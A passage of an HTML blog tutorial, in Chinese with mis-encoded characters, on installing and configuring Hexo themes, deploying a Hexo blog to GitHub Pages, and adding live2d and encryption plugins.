title="å®‰è£…"></a>å®‰è£…</h3><p><a href="https://theme-stun.github.io/docs/zh-CN/guide/quick-start.html#%E4%BD%BF%E7%94%A8">å¸®åŠ©æ–‡æ¡£</a><br>åœ¨Hexo æ ¹ç›®å½•ä¸‹æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean  <br><span class="hljs-comment">#è¯¥å‘½ä»¤çš„ä½œç”¨æ˜¯æ¸…é™¤ç¼“å­˜ï¼Œè‹¥ä¸è¾“å…¥æ­¤å‘½ä»¤ï¼ŒæœåŠ¡å™¨æœ‰å¯èƒ½æ›´æ–°ä¸äº†ä¸»é¢˜</span><br>$ git <span class="hljs-built_in">clone</span> https://github.com/liuyib/hexo-theme-stun.git themes/stun<br><br><span class="hljs-comment">#å®‰è£…ä¾èµ–hexo-renderer-pug</span><br>$ npm install --save hexo-renderer-pug<br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p>ä¿®æ”¹Hexoç›®å½•ä¸‹çš„<code>_config.yml</code>é…ç½®æ–‡ä»¶ä¸­çš„themeå±æ€§ï¼Œå°†é»˜è®¤çš„<code>landscapeæ”¹</code>ä¸ºä¸º<code>black-blue</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">101| theme: stun<br></code></pre></td></tr></table></figure><p>ç„¶åï¼Œå¯åŠ¨ Hexo æœåŠ¡å™¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean <br>$ hexo s<br></code></pre></td></tr></table></figure><h3 id="æ›´æ–°"><a href="#æ›´æ–°" class="headerlink" title="æ›´æ–°"></a>æ›´æ–°</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> themes/stun<br>$ git pull<br></code></pre></td></tr></table></figure><h3 id="æœ¬åœ°æ•ˆæœ"><a href="#æœ¬åœ°æ•ˆæœ" class="headerlink" title="æœ¬åœ°æ•ˆæœ"></a>æœ¬åœ°æ•ˆæœ</h3><p>è®¿é—®ï¼š<a href="http://localhost:4000/">http://localhost:4000/</a><br><img src="https://img-blog.csdnimg.cn/20210131211931994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="ä¸»é¢˜ä¼˜åŒ–"><a href="#ä¸»é¢˜ä¼˜åŒ–" class="headerlink" title="ä¸»é¢˜ä¼˜åŒ–"></a>ä¸»é¢˜ä¼˜åŒ–</h3><p>å®‰è£…ä¾èµ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ npm install --save hexo-render-pug<br>$ npm install --save hexo-generator-search<br>$ npm install --save hexo-deployer-git  <br></code></pre></td></tr></table></figure><p>1.å¢åŠ é¡µé¢å¯¼èˆª</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$ hexo <span class="hljs-keyword">new</span> page categories<br>$ hexo <span class="hljs-keyword">new</span> page tags<br></code></pre></td></tr></table></figure><p>åœ¨é¡¹ç›®ç›®å½•<code>/source/categories/index.md</code> åŠ ä¸Š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">type</span>: categories<br></code></pre></td></tr></table></figure><p>åœ¨é¡¹ç›®ç›®å½•<code>/source/tags/index.md</code> åŠ ä¸Š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">type</span>: tags<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹é…ç½®æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#å±•ç¤ºè®¾ç½®</span><br>title: &#123;$è‡ªå®šä¹‰æ–‡å­—&#125;<br>language: zh-CN <br>url: &#123;$åšå®¢åœ°å€&#125;<br><br><span class="hljs-comment">#ä¸»é¢˜</span><br>theme: stun<br><br><span class="hljs-comment">#gitç›¸å…³</span><br>deploy:<br>  type: git<br>  repo: <br>  github: &#123;$ä½ çš„åšå®¢ä»“åº“&#125;<br>  gitee: &#123;$ä½ çš„åšå®¢ä»“åº“&#125;<br>  branch: master<br><br><span class="hljs-comment">#æœç´¢ç›¸å…³</span><br>search:<br>  path: search.json<br>  field: post<br>  content: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>2.ä¿®æ”¹éƒ¨ç½²æ–‡ä»¶å¤¹ä¸‹/themes/stun/_config.yml(æŒ‘é€‰é‡è¦éƒ¨åˆ†ä¿®æ”¹)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#å–æ¶ˆå¯¼èˆªæ æ³¨é‡Šï¼ˆæ³¨æ„ç©ºæ ¼å¯¹é½ï¼‰</span><br>menu:<br>  categories: /categories/ || fas fa-layer-group<br>  tags: /tags/ || fas fa-tags<br>  <br><span class="hljs-comment">#æ›´æ”¹å›¾æ ‡(æœ€å¥½ä½¿ç”¨é“¾æ¥åœ°å€ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„å›¾åºŠï¼Œå›¾åºŠä½¿ç”¨è§ä¸‹ä¸€ç¯‡åšå®¢)</span><br>favicon:<br>  small: https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-16x16.png<br>  medium: https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-32x32.png<br><br><span class="hljs-comment">#æ›´æ”¹èƒŒæ™¯å¤§å›¾</span><br>header:<br>  bg_image:<br>    <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br>    url: https://gitee.com/BothSavage/PicGo/raw/master/image/èƒŒæ™¯.png<br><br><span class="hljs-comment">#æ›´æ”¹å¤´åƒå¤§å›¾ï¼Œå¹¶è®¾ä¸ºåœ†å½¢</span><br>author:<br>  avatar:<br>    url: https://gitee.com/BothSavage/PicGo/raw/master/image/å¤´åƒ.png<br>    rounded: <span class="hljs-literal">true</span><br>    <br><span class="hljs-comment">#æ‰“å¼€è®¿é—®ç»Ÿè®¡</span><br>busuanzi:<br>  <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br>  <br><span class="hljs-comment">#æ‰“å¼€æœç´¢åŠŸèƒ½</span><br>local_search:<br>  <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h2 id="ä¸»é¢˜2ï¼šblack-blue"><a href="#ä¸»é¢˜2ï¼šblack-blue" class="headerlink" title="ä¸»é¢˜2ï¼šblack-blue"></a>ä¸»é¢˜2ï¼šblack-blue</h2><h3 id="å®‰è£…-1"><a href="#å®‰è£…-1" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean<br>$ git <span class="hljs-built_in">clone</span> https://github.com/maochunguang/black-blue.git themes/stun<br><br><span class="hljs-comment">#å®‰è£…ä¾èµ–</span><br>npm install --save hexo-renderer-jade hexo-renderer-stylus<br>npm install --save hexo-generator-feed hexo-generator-sitemap hexo-generator-archive hexo-browsersync<br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨-1"><a href="#ä½¿ç”¨-1" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p>ä¿®æ”¹ Hexo æ ¹ç›®å½•ä¸‹çš„ <code>_config.yml</code> æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">101| theme: black-blue<br></code></pre></td></tr></table></figure><p>ä¿å­˜ç„¶åæ‰§è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean <br>$ hexo g <span class="hljs-comment"># ç”Ÿæˆ</span><br>$ hexo s <span class="hljs-comment"># å¯åŠ¨æœ¬åœ°webæœåŠ¡å™¨</span><br></code></pre></td></tr></table></figure><h3 id="æ›´æ–°ä¸»é¢˜"><a href="#æ›´æ–°ä¸»é¢˜" class="headerlink" title="æ›´æ–°ä¸»é¢˜"></a>æ›´æ–°ä¸»é¢˜</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> themes/black-blue<br>$ git pull<br></code></pre></td></tr></table></figure><h2 id="ä¸»é¢˜3ï¼šspfk"><a href="#ä¸»é¢˜3ï¼šspfk" class="headerlink" title="ä¸»é¢˜3ï¼šspfk"></a>ä¸»é¢˜3ï¼šspfk</h2><h3 id="å®‰è£…-2"><a href="#å®‰è£…-2" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean<br>$ git <span class="hljs-built_in">clone</span> https://github.com/luuman/hexo-theme-spfk.git themes/stun<br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨-2"><a href="#ä½¿ç”¨-2" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p>ä¿®æ”¹ Hexo æ ¹ç›®å½•ä¸‹çš„ <code>_config.yml</code> æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">101| theme: black-blue<br></code></pre></td></tr></table></figure><p>ä¿å­˜ç„¶åæ‰§è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean <br>$ hexo g <span class="hljs-comment"># ç”Ÿæˆ</span><br>$ hexo s <span class="hljs-comment"># å¯åŠ¨æœ¬åœ°webæœåŠ¡å™¨</span><br></code></pre></td></tr></table></figure><h3 id="ä¸»é¢˜ä¼˜åŒ–-1"><a href="#ä¸»é¢˜ä¼˜åŒ–-1" class="headerlink" title="ä¸»é¢˜ä¼˜åŒ–"></a>ä¸»é¢˜ä¼˜åŒ–</h3><p><strong>1.åšå®¢ä¸ªäººä¿¡æ¯</strong><br>ä¿®æ”¹Hexoæ–‡ä»¶å¤¹æ ¹ç›®å½•ä¸‹çš„ <code>_config.yml</code> æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#ç«™ç‚¹æ ‡é¢˜</span><br><span class="hljs-number">6</span>| title: Atkx<span class="hljs-string">&#x27; blog</span><br><span class="hljs-string">#ä½œè€…</span><br><span class="hljs-string">10| author: Atkx</span><br></code></pre></td></tr></table></figure><p><strong>2.å¤´åƒè®¾ç½®</strong><br>è¿™é‡Œä¿®æ”¹ä¸»é¢˜æ–‡ä»¶å¤¹ä¸‹çš„<code>_config.yml</code> æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># Link to your avatar |å¡«å†™å¤´åƒåœ°å€</span><br><span class="hljs-number">16</span>| avatar: img/atkx_32x32.png<br><span class="hljs-comment"># Small icon of Your site | ç«™ç‚¹å°å›¾æ ‡åœ°å€</span><br><span class="hljs-number">19</span>| favicon: img/atkx_16x16.png<br></code></pre></td></tr></table></figure><h1 id="Hexoéƒ¨ç½²åˆ°github"><a href="#Hexoéƒ¨ç½²åˆ°github" class="headerlink" title="Hexoéƒ¨ç½²åˆ°github"></a>Hexoéƒ¨ç½²åˆ°github</h1><h2 id="é…ç½®github-ssh"><a href="#é…ç½®github-ssh" class="headerlink" title="é…ç½®github ssh"></a>é…ç½®github ssh</h2><blockquote><p>åªæœ‰é…ç½®å¥½ SSH å¯†é’¥åï¼Œæˆ‘ä»¬æ‰å¯ä»¥é€šè¿‡ git æ“ä½œå®ç°æœ¬åœ°ä»£ç åº“ä¸ Github ä»£ç åº“åŒæ­¥ã€‚</p></blockquote><p>åœ¨ä½ ç¬¬ä¸€æ¬¡æ–°å»ºçš„æ–‡ä»¶å¤¹é‡Œé¢ï¼Œç‚¹å‡» Git Bash Here è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh-keygen -t rsa -C <span class="hljs-string">&quot;ä½ çš„é‚®ç®±&quot;</span><br></code></pre></td></tr></table></figure><p>ç”Ÿæˆä¸€å¯¹å¯†é’¥ SSH keyï¼ŒæŒç»­enterã€‚</p><p>åœ¨è·¯å¾„<code>C:\Users\admin\.ssh</code>ä¸‹æ‰¾åˆ°<code>id_rsa.pub</code>ï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œå¤åˆ¶é‡Œé¢çš„å†…å®¹ã€‚</p><p>é…ç½®è·¯å¾„ï¼šgithub ç½‘ç«™â€“&gt;Settingsâ€“&gt;SSH and GPG keysâ€“&gt;NEW SSH KEY ,titleéšä¾¿å¡«å†™ï¼ŒæŠŠä¸Šé¢å¤åˆ¶çš„å†…å®¹ç²˜è´´è¿›Keyé‡Œé¢ï¼Œç‚¹å‡»Add SSH keyã€‚</p><p><img src="https://img-blog.csdnimg.cn/20210131144015618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¾“å…¥å‘½ä»¤æ£€éªŒæ˜¯å¦æˆåŠŸã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh -T git@github.com<br>Hi swhat! You<span class="hljs-string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span><br></code></pre></td></tr></table></figure><h2 id="éƒ¨ç½²æ–‡ä»¶"><a href="#éƒ¨ç½²æ–‡ä»¶" class="headerlink" title="éƒ¨ç½²æ–‡ä»¶"></a>éƒ¨ç½²æ–‡ä»¶</h2><p>ç”¨sublimeæ‰“å¼€blogä¸‹åˆ›å»ºçš„ç”¨æˆ·åæ–‡ä»¶è¿›è¡Œéƒ¨ç½²ï¼ˆå°†æ–‡ä»¶ç›´æ¥æ‹–è¿›å»å°±å¯ä»¥äº†ï¼‰æ‰“å¼€ä»“åº“<code>_config.yml</code> é…ç½®æ–‡ä»¶ï¼Œ</p><p>ç¬¬16è¡Œ,æ›´æ”¹url</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://swhat.github.io<br></code></pre></td></tr></table></figure><p>æ‹‰åˆ°æ–‡ä»¶æœ«å°¾ï¼Œå¡«ä¸Šå¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Deployment</span><br><span class="hljs-comment">## Docs: https://hexo.io/docs/one-command-deployment</span><br>deploy:<br>  <span class="hljs-built_in">type</span>: git<br>  repo: https://github.com/swhat/swhat.github.io.git <br>  <span class="hljs-comment">#ä»“åº“åå­—æ”¹æˆè‡ªå·±çš„</span><br>  branch: master<br></code></pre></td></tr></table></figure><p><em>è‹¥ç«¯å£å†²çªï¼Œä¹Ÿå¯ä»¥åœ¨<code>_config.yml</code>ä¸­æ·»åŠ </em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">server:<br>  port: 4001 <span class="hljs-comment">#ç«¯å£å·éšæ„ï¼Œé»˜è®¤æ˜¯4000</span><br>  compress: <span class="hljs-literal">true</span><br>  header: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>è¿›å…¥ç›®å½•ï¼Œæ‰§è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo g -d<br></code></pre></td></tr></table></figure><p>ä¼šæŠ¥é”™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ERROR Deployer not found: git<br></code></pre></td></tr></table></figure><p>å®‰è£…ä¾èµ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install --save hexo-deployer-git<br></code></pre></td></tr></table></figure><p>é‡æ–°æ‰§è¡Œ<code>hexo g -d</code>ï¼Œåœ¨å¼¹å‡ºçš„æ¡†å­ä¸­ï¼Œè¾“å…¥githubç”¨æˆ·åå’Œå¯†ç <br><img src="https://img-blog.csdnimg.cn/20210131153540546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘½ä»¤è¡Œä¹Ÿè¾“å…¥githubç”¨æˆ·åå’Œå¯†ç <br><img src="https://img-blog.csdnimg.cn/20210131210759817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="ç½‘ç«™æ•ˆæœ"><a href="#ç½‘ç«™æ•ˆæœ" class="headerlink" title="ç½‘ç«™æ•ˆæœ"></a>ç½‘ç«™æ•ˆæœ</h2><p>è®¿é—®ï¼š<a href="https://swhat.github.io/">https://swhat.github.io</a><br><img src="https://img-blog.csdnimg.cn/20210131210907129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="å‘å¸ƒæ–‡ç« "><a href="#å‘å¸ƒæ–‡ç« " class="headerlink" title="å‘å¸ƒæ–‡ç« "></a>å‘å¸ƒæ–‡ç« </h2><p>æ–¹æ³•ä¸€ï¼šæ–°å»ºä¸€ä¸ªç©ºæ–‡ç« ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo n <span class="hljs-string">&quot;æ–‡ç« æ ‡é¢˜&quot;</span><br></code></pre></td></tr></table></figure><p>å¦‚ï¼šæ‰§è¡Œ<code>hexo new &quot;My New Post&quot;</code>ï¼Œä¼šåœ¨é¡¹ç›® <code>\Hexo\source\_posts</code> ä¸­ç”Ÿæˆ My New Post.md æ–‡ä»¶ï¼Œå¯ä»¥è¿›è¡Œç¼–è¾‘ã€‚</p><p>æ–¹æ³•äºŒï¼šä¹Ÿå¯ä»¥åœ¨é¡¹ç›® <code>\Hexo\source\_posts</code>ä¸‹ï¼Œæ–°å»ºmd æ–‡ä»¶ï¼Œç„¶åæ·»åŠ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">title: æ–‡ç« æ ‡é¢˜<br>date: æ—¶é—´ï¼Œå¦‚2020-02-02 02:02:02<br>categories: ç±»åˆ«<br>tags:  æ ‡ç­¾<br></code></pre></td></tr></table></figure><p>åœ¨mdæ–‡ç« ä¸­æ·»åŠ ä¸‹é¢çš„å¥å­ï¼Œè¯¥å¥å­ä»¥ä¸Šå¯ä»¥æ˜¾ç¤ºä½ æƒ³æ˜¾ç¤ºçš„å†…å®¹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!-- more --&gt;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬ç”¨ç¼–è¾‘å™¨å†™å¥½æ–‡ç« åï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†å…¶æ¨é€åˆ°æœåŠ¡å™¨ä¸Š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean<br>$ hexo g -d<br></code></pre></td></tr></table></figure><h1 id="åšå®¢ä¼˜åŒ–"><a href="#åšå®¢ä¼˜åŒ–" class="headerlink" title="åšå®¢ä¼˜åŒ–"></a>åšå®¢ä¼˜åŒ–</h1><h2 id="æ·»åŠ çœ‹æ¿å¨˜"><a href="#æ·»åŠ çœ‹æ¿å¨˜" class="headerlink" title="æ·»åŠ çœ‹æ¿å¨˜"></a>æ·»åŠ çœ‹æ¿å¨˜</h2><p>1ã€å®‰è£…æ¨¡å—<br> åœ¨hexoæ ¹ç›®å½•æ‰§è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install --save hexo-helper-live2d<br></code></pre></td></tr></table></figure><p>å¯ä»¥åœ¨<code>package.json</code>æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/20210203145531821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ­¤æ—¶å†å» node_moduelsç›®å½•ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°æœ‰å¦‚ä¸‹æ–‡ä»¶å¤¹ï¼Œè¿™äº›éƒ½æ˜¯åŠ¨ç”»ä¸»é…ç½®<br><img src="https://img-blog.csdnimg.cn/2021020314565224.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>2ã€ä¸‹è½½æ¨¡å‹<br>åœ°å€ï¼š<a href="https://github.com/xiazeyu/live2d-widget-models.git">https://github.com/xiazeyu/live2d-widget-models.git</a></p><p>ä¸‹è½½å¥½ä¹‹åå°†<code>packages</code>é‡Œçš„æ‰€æœ‰åŠ¨ç”»æ¨¡æ¿æ‹·è´åˆ°åšå®¢çš„<code>node_modules</code>ç›®å½•ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">live2d-widget-model-chitose<br>live2d-widget-model-epsilon2_1<br>live2d-widget-model-gf<br>live2d-widget-model-haru<br>live2d-widget-model-haruto<br>live2d-widget-model-hibiki<br>live2d-widget-model-hijiki<br>live2d-widget-model-izumi<br>live2d-widget-model-koharu<br>live2d-widget-model-miku<br>live2d-widget-model-ni-j<br>live2d-widget-model-nico<br>live2d-widget-model-nietzsche<br>live2d-widget-model-nipsilon<br>live2d-widget-model-nito<br>live2d-widget-model-shizuku<br>live2d-widget-model-tororo<br>live2d-widget-model-tsumiki<br>live2d-widget-model-unitychan<br>live2d-widget-model-wanko<br>live2d-widget-model-z16<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥æŒ‘é€‰è‡ªå·±å–œæ¬¢çš„æ¨¡å‹ï¼Œä½¿ç”¨å‘½ä»¤å®‰è£…æ¨¡å‹ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install live2d-widget-model-haruto<br></code></pre></td></tr></table></figure><p>4.è¯¦ç»†é…ç½®<br>åœ¨Hexoçš„ _config.yml æ–‡ä»¶æˆ–ä¸»é¢˜çš„ _config.yml æ–‡ä»¶ä¸­æ·»åŠ é…ç½®.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">live2d:<br>  <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br>  pluginModelPath: assets/<br>  model:<br>    use: live2d-widget-model-haruto  <br>    <span class="hljs-comment">#æ¨¡æ¿ç›®å½•ï¼Œåœ¨node_modulesé‡Œï¼Œè¿™é‡Œæ˜¯æ¨¡å‹åç§°</span><br>  display:<br>    position: right<br>    width: 150 <br>    height: 300<br>  mobile:<br>    show: <span class="hljs-literal">false</span>  <span class="hljs-comment">#æ˜¯å¦åœ¨æ‰‹æœºè¿›è¡Œæ˜¾ç¤º</span><br></code></pre></td></tr></table></figure><h2 id="åšå®¢åŠ å¯†"><a href="#åšå®¢åŠ å¯†" class="headerlink" title="åšå®¢åŠ å¯†"></a>åšå®¢åŠ å¯†</h2><p>1.å®‰è£…encryptæ’ä»¶<br>åœ¨åšå®¢ç›®å½•ä¸‹æ‰§è¡Œä¸‹é¢çš„æŒ‡ä»¤å®‰è£…encrypt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install --save hexo-blog-encrypt<br></code></pre></td></tr></table></figure><p>å®‰è£…å®Œæˆåï¼Œåœ¨package.jsonæ–‡ä»¶çš„dependeciesä¾èµ–ä¸­çœ‹åˆ°encryptæ’ä»¶<br><img src="https://img-blog.csdnimg.cn/20210205121402142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>2 . åŠ å¯†æ–‡ç« è®¾ç½®<br>å°†â€passwordâ€å­—æ®µæ·»åŠ åˆ°æ–‡ç« ä¿¡æ¯å¤´éƒ¨ï¼š</p><figure class="highlight 